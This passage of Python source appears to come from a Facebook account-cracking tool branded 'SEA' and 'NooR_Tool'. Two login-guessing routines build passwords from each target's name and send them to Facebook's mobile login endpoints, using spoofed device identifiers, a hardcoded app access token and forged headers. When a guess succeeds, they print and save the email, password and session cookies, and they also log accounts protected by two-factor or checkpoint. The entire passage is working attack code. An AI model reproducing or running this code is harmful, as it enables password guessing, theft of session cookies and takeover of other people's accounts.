        except Exception as e:
            pass
#----------------\<-FILE-M3-API->/----------------#
    def __M3X__(self,ids,names,passlist):
        try:
            global loop,oks,cps
            color = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
            sys.stdout.write(f'\r{xp}{W}-{G}<[{B}{color}SEA-F3{G}]>{W}-{G}<[{color}{self.loop}{G}]>{W}-{G}<[{B}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}{G}]> ');sys.stdout.flush()
            fn = names.split(' ')[0]
            try:ln = names.split(' ')[1]
            except:ln = fn
            for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                ua = UserAgentGenerator().generate("ios")
                accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                random_seed = random.Random()
                adid = str("".join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                data = {"adid": adid,"format": "json","device_id": device_id,"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": f"{accessToken}","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_GB","client_country_code": "GB","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {"User-Agent": ua,"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","X-FB-Net-HNI": str(random.randint(20000, 40000)),"X-FB-SIM-HNI": str(random.randint(20000, 40000)),"X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",}
                url = "https://api.facebook.com/auth/login"
                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                po = requests.post(url,data=data,headers=headers).json()
                if 'session_key' in po:
                    colorX = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"]) 
                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    print(f'\r{xp}{W}-{G}<[{B}SEA-OK{G}]>{B} '+ids+f'{W} / {B}'+pas+'\033[1;97m')
                    if 'y' in self.__COOKIE__:
                        print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} sb=Cracked.By-NooR_Tool;'+coki);__LINE__()
                    open('/sdcard/SEA-XD/FILE/SEA-M3-OK.txt','a').write(ids+'/'+pas+'/sb=Cracked.By-NooR_Tool;'+coki+'\n')
                    self.oks.append(ids)
                    break
                if twf in str(po):
                    print(f'\r{xp}{W}-{G}<[{Y}SEA-2F{G}]>{Y} '+ids+f'{W} / {Y}'+pas+'\033[1;97m')
                    open('/sdcard/SEA-XD/FILE/SEA-M3-2F.txt','a').write(ids+'/'+pas+'\n')
                    self.twf.append(ids)
                    break
                if 'www.facebook.com' in po['error']['message']:
                    print(f'\r{xp}{W}-{G}<[{R}SEA-CP{G}]>{R} '+ids+f'{W} / {R}'+pas+'\033[1;97m')
                    open('/sdcard/SEA-XD/FILE/SEA-M3-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
            self.loop+=1
        except Exception as e:
            pass
#----------------\<-FILE-M4-B-API->/----------------#
    def __M4X__(self,ids,names,passlist):
        try:
            global loop,oks,cps
            color = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
            sys.stdout.write(f'\r{xp}{W}-{G}<[{B}{color}SEA-F4{G}]>{W}-{G}<[{color}{self.loop}{G}]>{W}-{G}<[{B}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}{G}]> ');sys.stdout.flush()
            fn = names.split(' ')[0]
            try:ln = names.split(' ')[1]
            except:ln = fn
            for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                ua = UserAgentGenerator().generate("ios")
                accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                random_seed = random.Random()
                adid = str("".join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                data = {"adid":adid,"format":"json","device_id":device_id,"email":ids,"password":pas,"session_id": str(uuid.uuid4()),"advertiser_id": str(uuid.uuid4()),"reg_instance": str(uuid.uuid4()),"logged_out_id": str(uuid.uuid4()),"hash_id": str(uuid.uuid4()),"sim_country": "id","network_country": "id","enroll_misauth": "false","generate_analytics_claims":"1","credentials_type":"password","source":"login","error_detail_type":"button_with_disabled","enroll_misauth":"false","cpl": "true","generate_session_cookies":"1","generate_machine_id":"1","meta_inf_fbmeta":"","currently_logged_in_userid":"0","fb_api_req_friendly_name":"authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
                headers = {"Authorization":f"OAuth {accessToken}","X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),"X-FB-Net-HNI": str(random.randint(900000, 999999)),"X-FB-SIM-HNI": str(random.randint(20000, 40000)),"X-FB-Friendly-Name":"authenticate","X-FB-Connection-Type":"unknown","User-Agent":ua,"Accept-Encoding":"gzip, deflate","Content-Type": "application/x-www-form-urlencoded","X-FB-HTTP-Engine": "Liger"}
                url = "https://b-api.facebook.com/method/auth.login"
                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                po = requests.post(url,data=data,headers=headers).json()
                if 'session_key' in po:
                    colorX = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"]) 
                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    print(f'\r{xp}{W}-{G}<[{B}SEA-OK{G}]>{B} '+ids+f'{W} / {B}'+pas+'\033[1;97m')
                    if 'y' in self.__COOKIE__:
                        print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} sb=Cracked.By-NooR_Tool;'+coki);__LINE__()
                    open('/sdcard/SEA-XD/FILE/SEA-M4-OK.txt','a').write(ids+'/'+pas+'/sb=Cracked.By-NooR_Tool;'+coki+'\n')
                    self.oks.append(ids)
                    break
                if twf in str(po):
                    print(f'\r{xp}{W}-{G}<[{Y}SEA-2F{G}]>{Y} '+ids+f'{W} / {Y}'+pas+'\033[1;97m')
                    open('/sdcard/SEA-XD/FILE/SEA-M4-2F.txt','a').write(ids+'/'+pas+'\n')
                    self.twf.append(ids)
                    break
                if 'www.facebook.com' in po['error_msg']:
                    print(f'\r{xp}{W}-{G}<[{R}SEA-CP{G}]>{R} '+ids+f'{W} / {R}'+pas+'\033[1;97m')
                    open('/sdcard/SEA-XD/FILE/SEA-M4-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
            self.loop+=1
        except Exception as e:
            pass
#----------------\<-FILE-M5-HOST->/----------------#
#----------------\<-LAST-CALL->/----------------#
if __name__ == "__main__":
    __SEAXNOOR__().__MENU__()
#----------------\<-END-CALL->/----------------#